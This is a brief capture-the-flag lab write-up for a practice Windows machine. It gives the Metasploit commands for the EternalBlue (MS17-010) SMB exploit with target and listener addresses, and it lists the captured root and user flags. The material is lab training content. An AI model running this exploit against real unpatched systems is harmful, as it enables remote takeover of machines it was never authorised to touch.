# blue hmmm..... EternalBlue????
# lets try a smb exploit from metasploit


## [EXPLOIT]
    use windows/smb/ms17_010_eternalblue
    set rhosts 10.10.10.40
    set lhost 10.10.14.19


## [Priv Esc]
    NONE: got in as admin


## [FLAGS]
    ff548eb71e920ff6c08843ce9df4e717 C:\users\administrator\desktop\root.txt
    4c546aea7dbee75cbd71de245c8deea9 C:\users\haris\desktop\user.txt
